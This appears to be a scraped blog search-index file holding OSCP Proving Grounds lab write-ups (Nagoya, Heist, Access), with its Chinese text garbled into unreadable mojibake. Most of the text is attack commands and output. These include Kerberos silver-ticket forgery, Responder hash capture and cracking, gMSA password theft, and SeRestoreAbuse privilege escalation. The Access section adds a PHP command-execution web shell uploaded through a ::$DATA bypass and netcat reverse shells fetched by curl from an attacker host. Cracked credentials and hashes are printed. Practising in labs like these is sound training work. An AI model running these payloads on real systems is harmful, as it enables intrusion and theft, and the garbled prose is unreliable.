for mssql. Use everything you gathered to forge a silver ticket. Elevate your privileges on mssql by impersonating to administrator using the silver ticket. ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:4:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"ç™½é“¶ç¥¨æ® å› ä¸ºç°åœ¨å·²ç»æœ‰svc_mssqlçš„è´¦æˆ·å¯†ç ï¼Œå¯ä»¥è€ƒè™‘é€šè¿‡ç™½é“¶ç¥¨æ®ä¼ é€’ï¼Œæ¨¡æ‹Ÿé«˜æƒé™çš„ç®¡ç†å‘˜ã€‚ å›é¡¾ç™½é“¶ç¥¨æ®çš„åˆ©ç”¨æ¡ä»¶ï¼Œéœ€è¦å¦‚ä¸‹ä¿¡æ¯ï¼š è¦ä¼ªé€ çš„åŸŸç”¨æˆ·ï¼ˆä¸€èˆ¬æ˜¯åŸŸç®¡ç†å‘˜è´¦æˆ·ï¼‰: Administrator åŸŸå : nagoya-industries.com åŸŸçš„SIDå€¼ å¯åˆ©ç”¨çš„æœåŠ¡ : MSSQL ç›®æ ‡æœåŠ¡çš„SPN ç›®æ ‡æœåŠ¡è´¦æˆ·çš„NTLMå“ˆå¸Œ ç°åœ¨è¿˜éœ€è¦åŸŸçš„SIDã€MSSQLæœåŠ¡çš„SPNï¼Œsvc_mssqlçš„NTLM Hash ç›®å‰å·²æœ‰svc_mssqlçš„æ˜æ–‡å¯†ç ï¼Œä½¿ç”¨https://codebeautify.org/ntlm-hash-generator ç”Ÿæˆ NTLM Hashï¼Œ åŸŸçš„SIDé€šè¿‡powershellæŸ¥è¯¢ *Evil-WinRM* PS C:\\tmp\u003e Get-ADDomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=nagoya-industries,DC=com DeletedObjectsContainer : CN=Deleted Objects,DC=nagoya-industries,DC=com DistinguishedName : DC=nagoya-industries,DC=com DNSRoot : nagoya-industries.com DomainControllersContainer : OU=Domain Controllers,DC=nagoya-industries,DC=com DomainMode : Windows2016Domain DomainSID : S-1-5-21-1969309164-1513403977-1686805993 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=nagoya-industries,DC=com Forest : nagoya-industries.com InfrastructureMaster : nagoya.nagoya-industries.com LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=nagoya-industries,DC=com} LostAndFoundContainer : CN=LostAndFound,DC=nagoya-industries,DC=com ManagedBy : Name : nagoya-industries NetBIOSName : NAGOYA-IND ObjectClass : domainDNS ObjectGUID : 1153c877-efa1-443b-b59f-c32c9286750e ParentDomain : PDCEmulator : nagoya.nagoya-industries.com PublicKeyRequiredPasswordRolling : True QuotasContainer : CN=NTDS Quotas,DC=nagoya-industries,DC=com ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {nagoya.nagoya-industries.com} RIDMaster : nagoya.nagoya-industries.com SubordinateReferences : {DC=ForestDnsZones,DC=nagoya-industries,DC=com, DC=DomainDnsZones,DC=nagoya-industries,DC=com, CN=Configuration,DC=nagoya-industries,DC=com} SystemsContainer : CN=System,DC=nagoya-industries,DC=com UsersContainer : CN=Users,DC=nagoya-industries,DC=com MSSQLæœåŠ¡çš„SPN ä¹Ÿç”¨PowershellæŸ¥è¯¢ *Evil-WinRM* PS C:\\tmp\u003e Get-ADUser -Filter {SamAccountName -eq \"svc_mssql\"} -Properties ServicePrincipalNames DistinguishedName : CN=svc_mssql,CN=Users,DC=nagoya-industries,DC=com Enabled : True GivenName : svc_mssql Name : svc_mssql ObjectClass : user ObjectGUID : df7dda21-173f-4a4a-88ed-70d69481b46e SamAccountName : svc_mssql ServicePrincipalNames : {MSSQL/nagoya.nagoya-industries.com} SID : S-1-5-21-1969309164-1513403977-1686805993-1136 Surname : UserPrincipalName : svc_mssql@nagoya-industries.com æœ€åå¾—åˆ°æ‰€éœ€çš„å†…å®¹å¦‚ä¸‹ï¼š NTLM Hash: E3A0168BC21CFB88B95C954A5B18F57C Domain SID: S-1-5-21-1969309164-1513403977-1686805993 Service SPN: {MSSQL/nagoya.nagoya-industries.com} å‡†å¤‡å·¥ä½œå®Œæˆï¼Œé‚£å°±å°è¯•ç”Ÿæˆç™½é“¶ç¥¨æ® â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator æ¥ä¸‹å»å¯¼å…¥ç¥¨æ®ï¼Œè¿æ¥ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ export KRB5CCNAME=$PWD/Administrator.ccache â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ klist Ticket cache: FILE:/home/xavier/Desktop/OSCP/PG_Practice/Nagoya/Administrator.ccache Default principal: Administrator@NAGOYA-INDUSTRIES.COM Valid starting Expires Service principal 2024-02-07T20:20:46 2034-02-04T20:20:46 MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM renew until 2034-02-04T20:20:46 ç¼–è¾‘ /etc/hosts å’Œ /etc/krb5user.conf # /etc/hosts 127.0.0.1 nagoya.nagoya-industries.com nagoya-industries.com # /etc/krb5user.conf [libdefaults] default_realm = NAGOYA-INDUSTRIES.COM kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true rdns = false dns_canonicalize_hostname = false fcc-mit-ticketflags = true [realms] NAGOYA-INDUSTRIES.COM = { kdc = nagoya.nagoya-industries.com } [domain_realm] .nagoya-industries.com = NAGOYA-INDUSTRIES.COM è¿æ¥mssqlæœåŠ¡ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ impacket-mssqlclient -k nagoya.nagoya-industries.com Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Encryption requ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:4:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"Flag *Evil-WinRM* PS C:\\Users\\Christopher.Lewis\u003e type C:\\local.txt 81950a6ba1771f388080cb994a7fcb33 type C:\\Users\\Administrator\\Desktop\\proof.txt fa2dba2c7bdff500c6f6ce31dfa6037e ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"Heist è¿™æ˜¯ç¬¬21å°ï¼ŒWindowsç³»ç»Ÿï¼Œéš¾åº¦Hardï¼Œåç§° Heist 192.168.201.165 ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["é¶åœº"],"content":"PortScan â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.201.165 -T4 -p- [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-06 13:24 CST Nmap scan report for 192.168.201.165 Host is up (0.18s latency). Not shown: 65520 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-06 05:25:11Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 8080/tcp open http Werkzeug httpd 2.0.1 (Python 3.9.0) 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.83 seconds ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["é¶åœº"],"content":"InitAccess ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["é¶åœº"],"content":"8080-Web ç«¯å£æ‰«æå‘ç°8080çš„WebæœåŠ¡ï¼Œè®¿é—®åç•Œé¢å¦‚ä¸‹ï¼š æµ‹è¯•å‘ç°ä¸»è¦åŠŸèƒ½å°±æ˜¯æä¾›ä¸€ä¸ªåŠ è½½è¿œç¨‹URLçš„ä½œç”¨ï¼Œå­˜åœ¨SSRFï¼Œè¿œç¨‹æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯æ— æ³•åŠ è½½webshellï¼Œå‘½ä»¤æ— æ³•æ‰§è¡Œã€‚ è¿™æ—¶å€™æƒ³åˆ°è¿˜æœ‰ä¸€ç§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ResponderæŠ“å–NTLM Hash â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Heist] â””â”€$ sudo responder -I tun0 â€¦â€¦ [+] Listening for events... [HTTP] NTLMv2 Client : 192.168.201.165 [HTTP] NTLMv2 Username : HEIST\\enox [HTTP] NTLMv2 Hash : enox::HEIST:99fdc88fbe17e2ea:E30843CC9021CE657CE6B1BEAE267F2C:0101000000000000FC1C1B27C358DA01CFED432CAA26B82D0000000002000800430053004900430001001E00570049004E002D0031005600480034003400390041004A004700310034000400140043005300490043002E004C004F00430041004C0003003400570049004E002D0031005600480034003400390041004A004700310034002E0043005300490043002E004C004F00430041004C000500140043005300490043002E004C004F00430041004C0008003000300000000000000000000000003000002184FB7FA927C34729731C2A223CA1542BCB740A2C3C6CB8F29853E2F03C2D9C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003200320032000000000000000000 ç ´è§£Hash â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Heist] â””â”€$ hashcat -m 5600 -a 0 1.hash /usr/share/wordlists/rockyou.txt --force --quiet ENOX::HEIST:99fdc88fbe17e2ea:e30843cc9021ce657ce6b1beae267f2c:0101000000000000fc1c1b27c358da01cfed432caa26b82d0000000002000800430053004900430001001e00570049004e002d0031005600480034003400390041004a004700310034000400140043005300490043002e004c004f00430041004c0003003400570049004e002d0031005600480034003400390041004a004700310034002e0043005300490043002e004c004f00430041004c000500140043005300490043002e004c004f00430041004c0008003000300000000000000000000000003000002184fb7fa927c34729731c2a223ca1542bcb740a2c3c6cb8f29853e2f03c2d9c0a001000000000000000000000000000000000000900260048005400540050002f003100390032002e003100360038002e00340035002e003200320032000000000000000000:california å¾—åˆ°ä¸€ç»„ç”¨æˆ·åå¯†ç ï¼šenox/california ä½¿ç”¨è¿™ç»„ç”¨æˆ·åå¯†ç å°è¯•ç™»å½•ï¼Œä½¿ç”¨evil-winrmç™»å½•æˆåŠŸã€‚ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Heist] â””â”€$ evil-winrm -u enox -p california -i 192.168.201.165 Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e whoami heist\\enox *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e Get-ChildItem -Path C:\\Users\\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue Directory: C:\\Users\\enox\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2/5/2024 9:21 PM 34 local.txt *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e type C:\\Users\\enox\\Desktop\\local.txt 6d070d8770a2ef6468fab560c6f886f1 ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["é¶åœº"],"content":"PrivE ä¸Šä¼ winpeasè¿›è¡Œä¿¡æ¯æ”¶é›† *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e upload winPEASany.exe *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e ./winPEASany.exe \u003e 1.txt *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e download 1.txt ä¸Šä¼ SharpHound è¿›è¡ŒåŸŸä¿¡æ¯æ”¶é›† *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e upload SharpHound.exe *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e ./SharpHound.exe -c all --OutputPrefix \"Heist\" *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e download Heist_20240205234135_BloodHound.zip æ‰‹åŠ¨ä¿¡æ¯æ”¶é›† # ç”¨æˆ·ä¿¡æ¯å’Œç»„ä¿¡æ¯ *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e net user User accounts for \\\\ ------------------------------------------------------------------------------- Administrator enox Guest krbtgt The command completed with one or more errors. *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e net group Group Accounts for \\\\ ------------------------------------------------------------------------------- *Cloneable Domain Controllers *DnsUpdateProxy *Domain Admins *Domain Computers *Domain Controllers *Domain Guests *Domain Users *Enterprise Admins *Enterprise Key Admins *Enterprise Read-only Domain Controllers *Group Policy Creator Owners *Key Admins *Protected Users *Read-only Domain Controllers *Schema Admins *Web Admins The command completed with one or more errors. æ ¹æ®BloodHoundä¿¡æ¯æœé›†åˆ†æçš„ç»“æœçœ‹ï¼ŒWeb Adminsä¸‹æœ‰ä¸ªSVC_Apacheç”¨æˆ· æ ¹æ®åˆ°é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„åˆ†æå‘ç°ï¼ŒSVC_APACHEæ˜¯æˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªç›®æ ‡ã€‚ ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["é¶åœº"],"content":"SVC_APACHE æ ¹æ®ä¸Šå›¾æ³¨æ„åˆ°WebADMINç»„å¯ä»¥æ£€ç´¢GMSA SVC_APACHEçš„å¯†ç ã€‚ GMSA çš„é¢„æœŸç”¨é€”æ˜¯å…è®¸æŸäº›è®¡ç®—æœºå¸æˆ·æ£€ç´¢ GMSA çš„å¯†ç ï¼Œç„¶åä½œä¸º GMSA è¿è¡Œæœ¬åœ°æœåŠ¡ã€‚ æ§åˆ¶æˆæƒä¸»ä½“çš„æ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨è¯¥ç‰¹æƒæ¥å†’å…… GMSAã€‚ *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e net user enox User name enox Full Name Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 8/31/2021 5:09:05 AM Password expires Never Password changeable 9/1/2021 5:09:05 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 11/14/2023 9:10:55 PM Logon hours allowed All Local Group Memberships *Remote Management Use Global Group memberships *Web Admins *Domain Users The command completed successfully. æ£€æŸ¥ä¸‹å½“å‰è´¦æˆ·enoxï¼Œå‘ç°ä»–å°±æ˜¯Web Adminsç»„ç”¨æˆ·ï¼Œé‚£å°±å¯ä»¥åˆ©ç”¨GMSAè¯»å–SVC_APACHEçš„å¯†ç ã€‚ æˆ‘ä»¬ä½¿ç”¨ GMSAPasswordReader è¿›è¡Œåˆ©ç”¨ã€‚ *Evil-WinRM* PS C:\\Users\\enox\\Documents\u003e ./gmsapasswordreader.exe --accountname svc_apache Calculating hashes for Old Value [*] Input username : svc_apache$ [*] Input domain : HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : 83AC7FECFBF44780E3AAF5D04DD368A5 [*] aes128_cts_hmac_sha1 : 08E643C43F775FAC782EDBB04DD40541 [*] aes256_cts_hmac_sha1 : 588C2BB865E771ECAADCB48ECCF4BCBCD421BF329B0133A213C83086F1A2E3D7 [*] des_cbc_md5 : 9E340723700454E9 Calculating hashes for Current Value [*] Input username : svc_apache$ [*] Input domain : HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : 0AFF0D9DFA8B436E6688697B0A47B50C [*] aes128_cts_hmac_sha1 : C958BEE96DEE78F9035F460B91EC6D86 [*] aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988 [*] des_cbc_md5 : 0804169DCECB6102 ç”¨å½“å‰Hashå€¼ä½¿ç”¨Evil-WinRMè¿›è¡Œç™»å½• â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Heist] â””â”€$ evil-winrm -u 'svc_apache$' -H '0AFF0D9DFA8B436E6688697B0A47B50C' -i 192.168.201.165 Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e whoami heist\\svc_apache$ *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e æ£€æŸ¥å½“å‰ç”¨æˆ·æƒé™ *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeRestorePrivilege Restore files and directories Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled å‘ç°æœ‰SeRestorePrivilegeæƒé™ï¼Œå¯ä»¥åˆ©ç”¨ ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:4:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["é¶åœº"],"content":"SeRestorePrivilege è¿™é‡Œä½¿ç”¨SeRestoreAbuseè¿›è¡Œææƒã€‚ç¼–è¯‘å¥½åå°†å…¶ä¸Šä¼ ã€‚ # æ‰§è¡ŒæŠ¥é”™ *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e ./SeRestoreAbuse.exe \"cmd /c whoami\" # æœ‰æŠ¥é”™ï¼Œä½†æ˜¯ncæ‰§è¡Œäº†ï¼Œæ‰§è¡Œä¸€æ®µæ—¶é—´åå°±ä¼šæ–­å¼€ *Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents\u003e ./SeRestoreAbuse.exe \"C:\\tmp\\nc.exe 192.168.45.222 4444 -e powershell\" â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Heist] â””â”€$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.45.222] from (UNKNOWN) [192.168.201.165] 50526 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e whoami whoami nt authority\\system PS C:\\Windows\\system32\u003e dir C:\\users\\administrator\\desktop\\ dir C:\\users\\administrator\\desktop\\ Directory: C:\\users\\administrator\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2/5/2024 9:21 PM 34 proof.txt é‚£å°±åªèƒ½åœ¨ncæ‰§è¡ŒæœŸé—´ï¼Œè¿…é€Ÿçš„å†å»ºç«‹ä¸€ä¸ªshell â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Heist] â””â”€$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.45.222] from (UNKNOWN) [192.168.201.165] 50531 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e C:\\tmp\\nc.exe 192.168.45.222 5555 -e powershell C:\\tmp\\nc.exe 192.168.45.222 5555 -e powershell â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Heist] â””â”€$ nc -nlvp 5555 listening on [any] 5555 ... connect to [192.168.45.222] from (UNKNOWN) [192.168.201.165] 50534 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e type C:\\users\\administrator\\desktop\\proof.txt type C:\\users\\administrator\\desktop\\proof.txt 4af2fa343310e6880347c964d98caea1 PS C:\\Windows\\system32\u003e ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:4:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["é¶åœº"],"content":"Flag type C:\\Users\\enox\\Desktop\\local.txt 6d070d8770a2ef6468fab560c6f886f1 type C:\\users\\administrator\\desktop\\proof.txt 4af2fa343310e6880347c964d98caea1 ","date":"2024-02-06","objectID":"/posts/provinggrounds-heist/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Heist Writeup","uri":"/posts/provinggrounds-heist/"},{"categories":["é¶åœº"],"content":"Access ç¬¬14å°ï¼ŒWindowsç³»ç»Ÿï¼Œéš¾åº¦ä¸­ç­‰Intermediateï¼Œåç§° Access IPï¼š192.168.xx.187 ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"Port â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Access] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV -T4 192.168.167.187 [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 23:53 CST Nmap scan report for 192.168.167.187 Host is up (0.17s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-11 15:53:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.97 seconds ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"Init Access ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"53-DNS åŸŸä¼ é€å¤±è´¥ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ dnsrecon -d access.offsec -n 192.168.167.187 -t axfr [*] Checking for Zone Transfer for access.offsec name servers [*] Resolving SOA Record [+] SOA server.access.offsec 192.168.167.187 [*] Resolving NS Records [*] NS Servers found: [+] NS server.access.offsec 192.168.167.187 [*] Removing any duplicate NS server IP Addresses... [*] [*] Trying NS server 192.168.167.187 [+] 192.168.167.187 Has port 53 TCP Open [-] Zone Transfer Failed (Zone transfer error: REFUSED) ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"88-Kerberos åŸŸç”¨æˆ·çˆ†ç ´ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ sudo nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\"access.offsec\",userdb=\"/usr/share/wordlists/seclists/Usernames/Names/names.txt\" 192.168.167.187 æ— æˆæœ ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:3:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"80-http Webæ‰«æ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Access] â””â”€$ dirsearch -x 400,403,404 -t 500 -e php,ini,txt,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.167.187 â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Access] â””â”€$ dirsearch -x 400,404 -t 500 -e php,ini,txt,bak -u http://192.168.167.187 å‘ä¸‹å¦‚ä¸‹ï¼š http://192.168.167.187/cgi-bin/printenv.pl # ç³»ç»Ÿç¯å¢ƒä¿¡æ¯ å¯¹Webé¡µé¢è¿›è¡Œä¿¡æ¯æœé›†ï¼Œå‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹ å°è¯•ä¸Šä¼ PHPæ–‡ä»¶å¤±è´¥ å°è¯•ç»•è¿‡ Webæ‰«ææ—¶å‘ç°æœ‰ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Access] â””â”€$ dirsearch -x 400,404 -t 500 -e php,ini,txt,bak -u http://192.168.167.187 â€¦â€¦ [00:08:28] 301 - 344B - /uploads -\u003e http://192.168.167.187/uploads/ [00:08:28] 403 - 304B - /web.config::$DATA [00:08:29] 403 - 423B - /webalizer å°è¯•ä½¿ç”¨::$DATAè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼ŒæˆåŠŸã€‚ POST /Ticket.php HTTP/1.1 Host: 192.168.167.187 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------29739589853663594743950605566 Content-Length: 782 Origin: http://192.168.167.187 Connection: close Referer: http://192.168.167.187/ Upgrade-Insecure-Requests: 1 -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"your-name\" tst -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"your-email\" test@test.com -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"ticket-type\" standard-access -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"the_file\"; filename=\"test.PHP::$DATA\" Content-Type: application/x-php \u003c?php echo 123; echo system($_REQUEST['cmd']); ?\u003e -----------------------------29739589853663594743950605566 Content-Disposition: form-data; name=\"submit\" Purchase -----------------------------29739589853663594743950605566-- åœ¨uploadsç›®å½•ä¸‹æ‰¾åˆ°æ‰€ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå‘½ä»¤æ‰§è¡ŒæˆåŠŸ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Access] â””â”€$ curl \"http://192.168.167.187/uploads/test.PHP?cmd=whoami\" 123access\\svc_apache access\\svc_apache ä¸‹è½½ncï¼Œå¹¶è¿›è¡Œåå¼¹shell cmd=mkdir+C:\\tmp\\ cmd=dir+C:\\tmp\\ cmd=curl+http://192.168.45.169/nc64.exe+-o+C:\\tmp\\nc.exe cmd=C:\\tmp\\nc.exe+192.168.45.169+443+-e+powershell â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Access] â””â”€$ nc -nlvp 443 listening on [any] 443 ... connect to [192.168.45.169] from (UNKNOWN) [192.168.167.187] 50217 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\xampp\\htdocs\\uploads\u003e whoami whoami access\\svc_apache PS C:\\xampp\\htdocs\\uploads\u003e ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:3:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access 